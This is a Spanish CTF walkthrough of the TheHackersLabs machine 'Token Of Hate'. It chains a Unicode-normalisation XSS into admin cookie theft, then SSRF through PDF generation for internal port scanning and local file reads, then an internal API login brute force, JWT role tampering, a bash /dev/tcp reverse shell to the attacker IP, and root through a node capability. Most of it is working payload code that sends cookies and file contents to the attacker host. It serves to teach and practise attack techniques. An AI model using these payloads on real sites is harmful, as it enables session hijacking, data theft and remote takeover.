---
title: "TheHackersLabs"
date: 2025-03-16 00:00:00 +0800
categories: writeups thehackerslabs
tags: autopwn máquina linux cookiehijacking jwt capabilities rce xss ssrf lfi javascript scripting apiabuse api
description: Writeup de la máquina Token Of Hate de TheHackersLabs.
---

## Autopwned

<details>
  <summary>Haz click para ver el autopwned</summary>
  ```python
    print("Hola")
  ```
</details>

---
## Resumen de la resolución

**Token Of Hate** es una máquina **Linux** de dificultad **Insane (Experto)** de la plataforma de **TheHackersLabs**. Es una máquina que explota diversas vulnerabilidades web, veremos como conseguiremos robarle la cookie al admin lo que nos permite acceder a la sección de administración, en la cual podemos generar archivos **PDFs**. Dicha generación de archivos **PDFs**, nos permitirán explotar un SSRF para acceder a una **API** interna a través de la cual podemos ejecutar comandos remotamente. Finalmente, aprovechamos una capability en una copia del binario **node** para escalar privilegios y obtener acceso como **root**.

---
## Enumeración

En primer lugar, realizaremos un barrido en la red para encontrar la **Dirección IP** de la máquina víctima, para ello usaremos el siguiente comando.

```bash
arp-scan -I ens33 --localnet
```

A continuación podemos ver la **Dirección IP** ya que el **OUI** es **08:00:27**, correspondiente a una máquina virtual de **Virtual Box**.

![](<../assets/images/posts/2025-23-16-tokenofhate/Pasted image 20250315113137.png>)

Después le lanzaremos un **ping** para ver si se encuentra activa dicha máquina, además de ver si acepta la traza **ICM**. Comprobamos que efectivamente nos devuelve el paquete que le enviamos por lo que acepta la traza **ICMP**, gracias al **ttl** podremos saber si se trata de una máquina **Linux (TTL 64 )** y **Windows (TTL 128)**, y vemos que se trata de una máquina **Linux** pues cuenta con **TTL** próximo a 64 (**63**), además gracias al script **whichSystem.py** podremos conocer dicha información.

![](<../assets/images/posts/2025-23-16-tokenofhate/Pasted image 20250315113205.png>)
### Nmap

En segundo lugar, realizaremos un escaneo por **TCP** usando **Nmap** para ver que puertos de la máquina víctima se encuentra abiertos.

```bash
nmap -p- --open --min-rate 5000 -sS -v -Pn -n 192.168.26.92 -oG allPorts
```

Observamos como nos reporta que nos encuentran un montón de puertos abiertos, como es común en las máquinas windows.

![](<../assets/images/posts/2025-23-16-tokenofhate/Pasted image 20250315113016.png>)

Ahora gracias a la utilidad **getPorts** definida en nuestra **.zshrc** podremos copiarnos cómodamente todos los puerto abiertos de la máquina víctima a nuestra **clipboard**.

A continuación, volveremos a realizar un escaneo con **Nmap**, pero esta vez se trata de un escaneo más exhaustivo pues lanzaremos unos script básicos de reconocimiento, además de que nos intente reportar la versión y servicio que corre para cada puerto.

```bash
nmap -p80,22 -sCV 192.168.26.92 -oN targeted
```

En el segundo escaneo de **Nmap** no descubriremos nada interesante.

![](<../assets/images/posts/2025-23-16-tokenofhate/Pasted image 20250315113305.png>)

___
### Puerto 80 - HTTP (Apache)

Al acceder a la página web, veremos el siguiente texto, el cual nos indica que se está aplicando una normalización de caracteres y que el usuario **admin** está revisando los nuevos usuarios que se registran.

![](<../assets/images/posts/2025-23-16-tokenofhate/Pasted image 20250315181038.png>)

Registraremos un nuevo usuario (**trr0r**) y nos logearemos con el mismo, y veremos el contenido de la página privada.

![](<../assets/images/posts/2025-23-16-tokenofhate/Pasted image 20250315181116.png>)

En el código fuente de dicha página, veremos que hay un comentario indicando que existe una sección para los usuario con el rol **admin**.

![](<../assets/images/posts/2025-23-16-tokenofhate/Pasted image 20250315181134.png>)

Como bien hemos visto antes, el usuario **admin** está revisando los nuevos usuarios que se registran. Por lo tanto, registraremos un usuario que contenga un **XSS** que realicé una petición a un archivo alojado en nuestra máquina. Para ello, debemos de registrar un usuario con el siguiente contenido.

```html
＜script ｓｒｃ＝＂http：／／192．168．26．10／pwned．js＂＞＜／script＞
```

> Al registrar un usuario con los anteriores caracteres especiales (**Unicode**), evitaremos la comprobación que se realiza por caracteres como `>`, `<`, `"`, `/`, entre otros. Además, dado que se está aplicando una normalización de caracteres por detrás, finalmente estos serán convertidos a su forma original en **ASCII**.
{: .prompt-info }

Veremos como recibimos una petición al archivo `pwned.js`.

![](<../assets/images/posts/2025-23-16-tokenofhate/Pasted image 20250315181718.png>)

___
## Explotación
### XSS → Cookie Hijacking

El script `pwned.js` captura la cookie del usuario **admin** y la envía a nuestro servidor:

```js
let img = new Image()
img.src = "http://192.168.26.10/?cookie=" + document.cookie
```

Veremos que capturamos la cookie del administrador, por lo que podemos usarla para iniciar sesión como **admin**.

![](<../assets/images/posts/2025-23-16-tokenofhate/Pasted image 20250315181802.png>)

Estableceremos que nuestra cookie es la que acabamos de obtener, es decir la del usuario administrador. Veremos que conseguimos acceder a la sección del usuario administrador donde podemos generar **PDFs**.

![](<../assets/images/posts/2025-23-16-tokenofhate/Pasted image 20250315190221.png>)

El **PDF** que se nos genera contiene el siguiente contenido.

![](<../assets/images/posts/2025-23-16-tokenofhate/Pasted image 20250315190238.png>)

Al generar un **PDF**, observaremos que dicha funcionalidad permite hacer solicitudes al **localhost**.

![](<../assets/images/posts/2025-23-16-tokenofhate/Pasted image 20250315190248.png>)
### XSS → SSRF vía Dynamic PDF

Gracias al siguiente artículo [XSS to SSRF via Dynamic PDF](https://book.hacktricks.wiki/es/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf.html), podemos ver como acontecer un **SSRF** a través de la generación dinámica de **PDFs**.

Gracias al siguiente comando de bash, obtendremos un listado de los puertos más comunes.

```bash
for i in $(cat /usr/share/wordlists/SecLists/Discovery/Infrastructure/common-http-ports.txt); do echo -n "$i,"; done; echo
```

El siguiente contenido de `pwned.js` nos permitirá realizar un escaneo de los puertos abiertos internamente.

```js
function checkPorts(port){
  x=new XMLHttpRequest;
  x.onload=function(){new Image().src=`http://192.168.26.10/open?port=${port}`};
  x.open("GET",`http://localhost:${port}/`);x.send();
}

top_ports = [66,80,81,443,445,457,1080,1100,1241,1352,1433,1434,1521,1944,2301,3000,3128,3306,4000,4001,4002,4100,5000,5432,5800,5801,5802,6346,6347,7001,7002,8000,8080,8443,8888,30821]

for (let port of top_ports){
  checkPorts(port)
}
```

Volveremos a generar un **PDF** y obtendremos la confirmación de que el puerto **3000** está abierto.

![](<../assets/images/posts/2025-23-16-tokenofhate/Pasted image 20250315190517.png>)

Para ver el contenido de dicho puerto, es decir la respuesta, el contenido de `pwned.js` deberá de ser el sigueinte.

```js
x=new XMLHttpRequest;
x.onload=function(){new Image().src=`http://192.168.26.10/?resText=${btoa(this.responseText)}`};
x.open("GET","http://localhost:3000/");x.send();
```

Veremos como recibimos una petición con el contenido codificado en **base64**.

![](<../assets/images/posts/2025-23-16-tokenofhate/Pasted image 20250315190908.png>)

Gracias a la siguiente instrucción de bash, conseguiremos decodificar el contenido que está en **base64**.

```bash
echo -n "eyJu..." | base64 -d | jq
```

Veremos que en el puerto **3000** (abierto internamente), se encuentra una **API** a través de la cual podemos ejecutar comandos tras previamente habernos logeado como un usuario con el rol de **admin**.

![](<../assets/images/posts/2025-23-16-tokenofhate/Pasted image 20250315191011.png>)
### XSS → SSRF → LFI

Mediante la vulnerabilidad **SSRF**, intentamos leer archivos locales en el servidor, es decir aplicar un **LFI**. Para ello, el contenido de `pwned.js` ha de ser el siguiente.

```js
x=new XMLHttpRequest;
x.onload=function(){new Image().src=`http://192.168.26.10/?resText=${btoa(this.responseText)}`};
x.open("GET","file:///etc/passwd");x.send();
```

Veremos como recibimos una petición codificada en **base64**.

![](<../assets/images/posts/2025-23-16-tokenofhate/Pasted image 20250315191255.png>)

Volveremos a usar la misma instrucción de bash para decodificar el contenido está en **base64**.

```js
echo -n "cm9.." | base64 -d | grep "sh$"
```

Veremos los usuarios del sistema que tienen una terminal válida.

![](<../assets/images/posts/2025-23-16-tokenofhate/Pasted image 20250315191327.png>)

En este caso, leeremos el contenido del fichero `/etc/apache2/sites-availables/000-default.conf`, para ello hemos de modificar el `pwned.js`.

Descubriremos que el **DocumentRoot** del sitio web está en `/var/www/html`, además veremos unas credenciales de acceso a la base de datos (no nos servirán de nada).

![](<../assets/images/posts/2025-23-16-tokenofhate/Pasted image 20250315191533.png>)

Si intentamos leer el contenido de `/var/www/html/index.php` de la misma manera que lo hemos hecho hasta ahora, veremos que no lo lograremos. Por ello, es una buena razón para explorar una alternativa que nos permita visualizar el contenido de los archivos internos, lo cual será posible gracias al siguiente contenido de `pwned.js`.

```js
x=new XMLHttpRequest;
x.onload=function(){
  // No lo pasaremos a base64 (btoa), ya que si no, no funcionará
  new Image().src=`http://192.168.26.10/?resText=${this.responseText}`;
  // De igual forma, mostraremos el conteido en el pdf
  document.write(`<pre>${this.responseText}</pre>`) // Usaremos etiquetas preformateadas (<pre>) para ver el contenido correctamente
};
x.open("GET","file:///var/www/html/index.php");x.send();
```

En el **PDF** generado, veremos el contenido del `/var/www/html/index.php` y en el observemos una credenciales. 

![](<../assets/images/posts/2025-23-16-tokenofhate/Pasted image 20250315223908.png>)
### XSS → SSRF → API

Volveremos a cambiar el contenido de `pwned.js`, en este caso aplicaremos un mini ataque de fuerza bruta para descubrir que usuario tiene capacidad de logearse en la **API**.

```js
function checkUser(username, password){
  x=new XMLHttpRequest;
  x.onload=function(){new Image().src=`http://192.168.26.10/?resText=${btoa(this.responseText)}`; document.write(`[+] Username: ${username} -> ` + this.responseText + "<br>")};
  let data = JSON.stringify({"username": username, "password": password})
  x.open("POST","http://localhost:3000/login");
  x.setRequestHeader("Content-Type", "application/json");
  x.send(data);
}

let users = [
['admin', 'dUnAyw92B7qD4OVIqWXd'],
['Łukasz', 'dQnwTCpdCUGGqBQXedLd'],
['Þór', 'EYNlxMUjTbEDbNWSvwvQ'],
['Ægir', 'DXwgeMuQBAtCWPPQpJtv'],
['Çetin', 'FuLqqEAErWQsmTQQQhsb'],
['José', 'FuLqqEAErWQsmTQQQhsb']
];

for (let user of users){
  document.write(`[+] Username: ${user[0]}<br>`)
  checkUser(user[0], user[1])
}
```

Veremos que ningún usuario es capaz de logearse en la **API**.

![](<../assets/images/posts/2025-23-16-tokenofhate/Pasted image 20250315231256.png>)

Modificaremos el nombre de usuario remplazando los caracteres especiales (**Unicode**) por caracteres **ASCII**. Tal y como vemos a continuación, el usuario **Jose** tiene capacidad de logearse en la **API**.

![](<../assets/images/posts/2025-23-16-tokenofhate/Pasted image 20250315231340.png>)

Gracias al siguiente contenido del `pwned.js`, conseguiremos logearnos con las credenciales **Jose:FuLqqEAErWQsmTQQQhsb**.

```js
x=new XMLHttpRequest;
x.onload=function(){new Image().src=`http://192.168.26.10/?resText=${btoa(this.responseText)}`};
let data = JSON.stringify({"username": "Jose", "password": "FuLqqEAErWQsmTQQQhsb"})
x.open("POST","http://localhost:3000/login");
x.setRequestHeader("Content-Type", "application/json");
x.send(data);
```

En la respuesta de la petición, veremos un mensaje y un token necesario para acceder al endpoint **/command**, el cual aparentemente nos permite ejecutar comandos.

![](<../assets/images/posts/2025-23-16-tokenofhate/Pasted image 20250315192528.png>)

Volveremos a modificar el `pwned.js`, para ejecutar un `ping` a nuestra máquina de atacante.

```js
x=new XMLHttpRequest;
x.onload=function(){new Image().src=`http://192.168.26.10/?resText=${btoa(this.responseText)}`};
let data = JSON.stringify({"command": "ping -c 1 192.168.26.10", "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ikpvc2UiLCJyb2xlIjoidXNlciIsImlhdCI6MTc0MjA2MzEwMSwiZXhwIjoxNzQyMDY2NzAxfQ.jeAgJaUcaF9gtDJYzc8ig9nxuP9D7ckC1s8g5Lh7rmM"})
x.open("POST","http://localhost:3000/command");
x.setRequestHeader("Content-Type", "application/json");
x.send(data);
```

En la respuesta, veremos que no tenemos acceso, pues dicho endpoint solo está permitido para el **admin**.

![](<../assets/images/posts/2025-23-16-tokenofhate/Pasted image 20250315192659.png>)

Si nos dirigimos a [jwt.io](https://jwt.io/) y pegamos nuestro token, veremos en la figura el campo **role**, por lo que lo modificaremos a **admin**.

![](<../assets/images/posts/2025-23-16-tokenofhate/Pasted image 20250315192837.png>)

Veremos que en el respuesta de la petición, nos devuelve el output del comando.

![](<../assets/images/posts/2025-23-16-tokenofhate/Pasted image 20250315192947.png>)

Además, veremos como recibimos la traza **ICMP** de la máquina víctima.

![](<../assets/images/posts/2025-23-16-tokenofhate/Pasted image 20250315193041.png>)

A continuación, lo que haremos será ponernos en escucha con **Netcat** (`nc -nlvp 443`) y enviarnos una **Reverse Shell** gracias al típico one liner de bash (`bash -c 'bash -i >& /dev/tcp/192.168.26.10/443 0>&1'").

```js
x=new XMLHttpRequest;
x.onload=function(){new Image().src=`http://192.168.26.10/?resText=${btoa(this.responseText)}`};
let data = JSON.stringify({"command": "bash -c 'bash -i >& /dev/tcp/192.168.26.10/443 0>&1'", "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ikpvc2UiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NDIwNjMxMDEsImV4cCI6MTc0MjA2NjcwMX0._wQ0-N-vcor-8oxK3YElOZ9J8AB1GINxo_qfK0aXE8k"})
x.open("POST","http://localhost:3000/command");
x.setRequestHeader("Content-Type", "application/json");
x.send(data);
```

Veremos como recibimos correctamente la **Reverse Shell**, por lo que habremos ganado acceso a la máquina vícitma.

![](<../assets/images/posts/2025-23-16-tokenofhate/Pasted image 20250315193125.png>)

___
## Escalada de privilegios
### Enumeración local

Tras ganar acceso, realizaremos un *+Tratamiento de la TTY*.

Despues de enumerar un buen rato enumeración, me doy cuanto con una **Capabilities** un tanto extraña e inusual.

```bash
getcap -r / 2>/dev/null
```

![](<../assets/images/posts/2025-23-16-tokenofhate/Pasted image 20250315211239.png>)

Al ejecutar dicho binario sobre el que tengo la **Capability**, veremos que es una copia del binario **node**.

![](<../assets/images/posts/2025-23-16-tokenofhate/Pasted image 20250315211219.png>)
### Node | Capabilities

Nos dirigiremos a la siguiente página [GTFOBins - Node capability](https://gtfobins.github.io/gtfobins/node/#capabilities), y veremos que para elevar nuestros privilegio debemos ejecutar el siguiente comando. 

```bash
/usr/bin/yournode -e 'process.setuid(0); require("child_process").spawn("/bin/bash", {stdio: [0, 1, 2]})'
```

Tras ejecutarlo, veremos que nos otorga una shell como **root**, completando la explotación de la máquina.

![](<../assets/images/posts/2025-23-16-tokenofhate/Pasted image 20250315211343.png>)